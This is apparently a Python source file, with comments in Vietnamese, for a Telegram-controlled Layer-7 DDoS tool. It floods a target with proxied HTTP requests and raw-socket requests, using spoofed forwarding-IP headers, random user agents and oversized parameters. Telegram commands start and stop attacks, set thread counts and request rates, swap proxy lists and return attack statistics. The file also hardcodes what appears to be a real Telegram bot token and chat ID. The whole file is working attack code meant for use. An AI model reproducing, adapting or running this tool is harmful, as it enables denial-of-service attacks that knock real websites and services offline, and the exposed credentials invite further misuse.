import requests
import threading
import random
import time
import os
import socket
import ssl
import json
import sys
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# =====================================================
# DDOS LAYER7 - MỖI LỆNH CHẠY TỐI ĐA 120s
# TỰ ĐỘNG DỪNG SAU 120s, CÓ THỂ KHỞI ĐỘNG LẠI
# =====================================================

# -------------------- CẤU HÌNH TELEGRAM --------------------
TELEGRAM_BOT_TOKEN = "6320148381:AAFvtpr4l8t61IRgynsiUkwKVbCNMw9kdtU"
TELEGRAM_CHAT_ID = "-1003925717296"

# -------------------- CẤU HÌNH TẤN CÔNG --------------------
target_url = "http://192.168.1.100:8080"
target_host = "192.168.1.100"
target_port = 8080
proxy_file = "proxies.txt"
thread_count = 500
requests_per_second = 200
use_ssl = False
MAX_RUN_TIME = 120  # Tối đa 120 giây mỗi lần chạy

# -------------------- BIẾN TOÀN CỤC --------------------
stop_event = threading.Event()
attack_stats = {
    'total_requests': 0,
    'success_count': 0,
    'fail_count': 0,
    'status_codes': {},
    'bytes_sent': 0,
    'start_time': time.time(),
    'session_count': 0
}
stats_lock = threading.Lock()
proxy_list = []
user_agents = []
is_running = False
command_start_time = 0

# =====================================================
# LOAD USER-AGENT
# =====================================================
def load_user_agents():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/122.0",
    ]
    if os.path.exists("user_agents.txt"):
        with open("user_agents.txt", 'r') as f:
            for line in f:
                line = line.strip()
                if line:
                    agents.append(line)
    return agents

user_agents = load_user_agents()

# =====================================================
# ĐỌC PROXY
# =====================================================
def load_proxies(filepath):
    proxies = []
    if not os.path.exists(filepath):
        return []
    with open(filepath, 'r') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'):
                try:
                    if '://' in line:
                        proxy_str = line
                    elif '@' in line:
                        auth, addr = line.split('@')
                        user, passwd = auth.split(':')
                        ip, port = addr.split(':')
                        proxy_str = f"http://{user}:{passwd}@{ip}:{port}"
                    else:
                        ip, port = line.split(':')
                        proxy_str = f"http://{ip}:{port}"
                    proxies.append({'http': proxy_str, 'https': proxy_str})
                except:
                    continue
    return proxies

# =====================================================
# GỬI TELEGRAM
# =====================================================
def send_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {'chat_id': TELEGRAM_CHAT_ID, 'text': message, 'parse_mode': 'HTML'}
        requests.post(url, data=payload, timeout=5)
    except:
        pass

# =====================================================
# TẠO HEADER
# =====================================================
def generate_headers():
    return {
        'User-Agent': random.choice(user_agents),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9,en;q=0.8', 'zh-CN,zh;q=0.9,en;q=0.8']),
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive, Upgrade',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        'X-Real-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        'X-Originating-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        'Referer': random.choice([
            'https://www.google.com/',
            'https://www.facebook.com/',
            'https://www.youtube.com/',
            'https://twitter.com/',
            'https://www.instagram.com/'
        ])
    }

# =====================================================
# TẤN CÔNG HTTP
# =====================================================
def attack_http(proxy):
    session = requests.Session()
    session.proxies.update(proxy)
    session.timeout = 2
    session.verify = False
    
    methods = ['GET', 'POST', 'HEAD', 'OPTIONS']
    method = random.choice(methods)
    headers = generate_headers()
    
    url = target_url
    if method in ['GET', 'HEAD']:
        params = {f'p{random.randint(1,9999)}': 'x'*random.randint(10,1000) for _ in range(random.randint(3,10))}
        url += '?' + '&'.join([f"{k}={v}" for k,v in params.items()])
    
    try:
        if method == 'GET':
            r = session.get(url, headers=headers, timeout=2)
        elif method == 'POST':
            data = {f'f{i}': 'v'*random.randint(100,2000) for i in range(20)}
            r = session.post(url, data=data, headers=headers, timeout=2)
        elif method == 'HEAD':
            r = session.head(url, headers=headers, timeout=2)
        else:
            r = session.options(url, headers=headers, timeout=2)
        
        session.close()
        
        with stats_lock:
            attack_stats['total_requests'] += 1
            code = str(r.status_code)
            attack_stats['status_codes'][code] = attack_stats['status_codes'].get(code, 0) + 1
            if 200 <= r.status_code < 400:
                attack_stats['success_count'] += 1
            else:
                attack_stats['fail_count'] += 1
            attack_stats['bytes_sent'] += len(r.request.body or b'') + len(str(r.request.headers))
        return True
    except:
        with stats_lock:
            attack_stats['total_requests'] += 1
            attack_stats['fail_count'] += 1
        session.close()
        return False

# =====================================================
# TẤN CÔNG SOCKET
# =====================================================
def attack_socket(proxy=None):
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        
        if proxy:
            proxy_ip, proxy_port = proxy.replace('http://', '').split(':')
            sock.connect((proxy_ip, int(proxy_port)))
            connect_cmd = f"CONNECT {target_host}:{target_port} HTTP/1.1\r\nHost: {target_host}\r\n\r\n"
            sock.send(connect_cmd.encode())
            response = sock.recv(4096)
            if b'200' not in response:
                sock.close()
                return False
        else:
            sock.connect((target_host, target_port))
        
        if use_ssl:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=target_host)
        
        path = '/' + 'x'*random.randint(10,500) + f'?id={random.randint(1,999999)}&t={time.time()}'
        headers = generate_headers()
        request = f"GET {path} HTTP/1.1\r\n"
        for key, value in headers.items():
            request += f"{key}: {value}\r\n"
        request += "\r\n"
        
        for _ in range(random.randint(3,10)):
            sock.send(request.encode())
            time.sleep(0.001)
        
        sock.close()
        
        with stats_lock:
            attack_stats['total_requests'] += 1
            attack_stats['success_count'] += 1
            attack_stats['bytes_sent'] += len(request) * random.randint(3,10)
        return True
    except:
        with stats_lock:
            attack_stats['total_requests'] += 1
            attack_stats['fail_count'] += 1
        try:
            if sock:
                sock.close()
        except:
            pass
        return False

# =====================================================
# WORKER
# =====================================================
def attack_worker(proxy_pool):
    while not stop_event.is_set():
        try:
            if proxy_pool and random.random() < 0.7:
                proxy = random.choice(proxy_pool)
            else:
                proxy = None
            
            attack_type = random.choice(['http', 'socket', 'http', 'socket', 'http'])
            
            if attack_type == 'http' and proxy:
                attack_http(proxy)
            else:
                attack_socket(proxy)
            
            time.sleep(1.0 / requests_per_second)
        except:
            continue

# =====================================================
# THỐNG KÊ
# =====================================================
def get_stats_text():
    with stats_lock:
        elapsed = int(time.time() - attack_stats['start_time'])
        total = attack_stats['total_requests']
        success = attack_stats['success_count']
        fail = attack_stats['fail_count']
        rate = total / max(elapsed, 1)
        bytes_sent = attack_stats['bytes_sent'] / (1024 * 1024)
        codes = ', '.join([f"{k}:{v}" for k,v in list(attack_stats['status_codes'].items())[:5]])
        
        remaining = max(0, MAX_RUN_TIME - elapsed)
        
        status = "🟢 ĐANG CHẠY" if is_running else "🔴 ĐÃ DỪNG"
        
        return f"""
<b>🔥 DDOS LAYER7 - 120s MODE</b>
📌 Trạng thái: {status}
⏱ Đã chạy: {elapsed}s / {MAX_RUN_TIME}s
⏳ Còn lại: {remaining}s
📨 Tổng request: {total:,}
✅ Thành công: {success:,}
❌ Thất bại: {fail:,}
📈 Tốc độ: {rate:.1f} req/s
📊 Mã trạng thái: {codes or 'N/A'}
💾 Dữ liệu gửi: {bytes_sent:.2f} MB
🧵 Luồng: {threading.active_count() - 1}
🌐 Proxy: {len(proxy_list)}
🎯 Mục tiêu: {target_url}
        """

# =====================================================
# TELEGRAM LISTENER
# =====================================================
def telegram_listener():
    global is_running, command_start_time, attack_stats
    last_update_id = 0
    
    while True:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
            params = {'offset': last_update_id + 1, 'timeout': 15}
            r = requests.get(url, params=params, timeout=20)
            if r.status_code == 200:
                data = r.json()
                if data.get('ok'):
                    for update in data.get('result', []):
                        last_update_id = update['update_id']
                        msg = update.get('message', {})
                        if msg.get('chat', {}).get('id') == int(TELEGRAM_CHAT_ID):
                            text = msg.get('text', '').strip().lower()
                            
                            if text == '/attack':
                                if is_running:
                                    send_telegram("⚠️ Đang có một đợt tấn công chạy. Dùng /stop để dừng trước.")
                                else:
                                    # Reset stats
                                    with stats_lock:
                                        attack_stats = {
                                            'total_requests': 0,
                                            'success_count': 0,
                                            'fail_count': 0,
                                            'status_codes': {},
                                            'bytes_sent': 0,
                                            'start_time': time.time(),
                                            'session_count': attack_stats.get('session_count', 0) + 1
                                        }
                                    stop_event.clear()
                                    is_running = True
                                    command_start_time = time.time()
                                    send_telegram(f"▶️ Bắt đầu tấn công! Tự động dừng sau {MAX_RUN_TIME}s")
                                    
                                    # Khởi chạy worker mới
                                    threading.Thread(target=run_attack, daemon=True).start()
                            
                            elif text == '/stop':
                                stop_event.set()
                                is_running = False
                                send_telegram("⛔ Đã dừng tấn công!")
                            
                            elif text == '/status':
                                send_telegram(get_stats_text())
                            
                            elif text == '/help':
                                help_text = """
<b>🤖 LỆNH ĐIỀU KHIỂN - 120s MODE</b>
/attack - Bắt đầu tấn công (tự động dừng sau 120s)
/stop - Dừng tấn công ngay lập tức
/status - Xem trạng thái hiện tại
/threads &lt;số&gt; - Đổi số luồng
/speed &lt;số&gt; - Đổi tốc độ
/setproxy &lt;file&gt; - Đổi file proxy
/help - Trợ giúp
                                """
                                send_telegram(help_text)
                            
                            elif text.startswith('/threads'):
                                try:
                                    global thread_count
                                    thread_count = int(text.split()[1])
                                    send_telegram(f"✅ Đã cập nhật luồng: {thread_count}")
                                except:
                                    send_telegram("❌ Sai định dạng. Dùng: /threads <số>")
                            
                            elif text.startswith('/speed'):
                                try:
                                    global requests_per_second
                                    requests_per_second = int(text.split()[1])
                                    send_telegram(f"✅ Đã cập nhật tốc độ: {requests_per_second} req/s")
                                except:
                                    send_telegram("❌ Sai định dạng. Dùng: /speed <số>")
                            
                            elif text.startswith('/setproxy'):
                                try:
                                    global proxy_file, proxy_list
                                    new_file = text.split()[1]
                                    if os.path.exists(new_file):
                                        proxy_file = new_file
                                        proxy_list = load_proxies(proxy_file)
                                        send_telegram(f"✅ Đã đổi file proxy: {new_file} ({len(proxy_list)} proxy)")
                                    else:
                                        send_telegram(f"❌ Không tìm thấy file: {new_file}")
                                except:
                                    send_telegram("❌ Sai định dạng. Dùng: /setproxy <tên_file>")
            time.sleep(2)
        except:
            time.sleep(5)

# =====================================================
# CHẠY TẤN CÔNG VÀ TỰ ĐỘNG DỪNG SAU 120s
# =====================================================
def run_attack():
    global is_running
    proxy_pool = proxy_list
    
    # Khởi chạy worker
    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        futures = [executor.submit(attack_worker, proxy_pool) for _ in range(thread_count)]
        
        # Đợi 120s hoặc cho đến khi có lệnh dừng
        start = time.time()
        while time.time() - start < MAX_RUN_TIME and not stop_event.is_set():
            time.sleep(1)
            # Gửi cập nhật mỗi 30s
            elapsed = int(time.time() - start)
            if elapsed % 30 == 0 and elapsed > 0:
                send_telegram(f"⏳ Đã chạy {elapsed}s / {MAX_RUN_TIME}s - Tốc độ: {attack_stats['total_requests']/max(elapsed,1):.1f} req/s")
    
    # Dừng tất cả worker
    stop_event.set()
    is_running = False
    send_telegram(f"⏹️ Đã dừng sau {MAX_RUN_TIME}s. Tổng request: {attack_stats['total_requests']:,}")
    send_telegram(get_stats_text())

# =====================================================
# KHỞI CHẠY CHÍNH
# =====================================================
if __name__ == "__main__":
    # Tải proxy
    proxy_list = load_proxies(proxy_file)
    
    send_telegram(f"""
🚀 <b>DDOS LAYER7 - 120s MODE</b>
🎯 Mục tiêu: {target_url}
🧵 Số luồng: {thread_count}
🌐 Proxy: {len(proxy_list)}
📊 Tốc độ: {requests_per_second} req/s/luồng
⏱ Thời gian tối đa: {MAX_RUN_TIME}s

🤖 Gửi /help để xem lệnh
    """)
    
    # Khởi chạy listener
    threading.Thread(target=telegram_listener, daemon=True).start()
    
    # Giữ chương trình chạy
    try:
        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        stop_event.set()
        send_telegram("⛔ Người dùng dừng chương trình.")
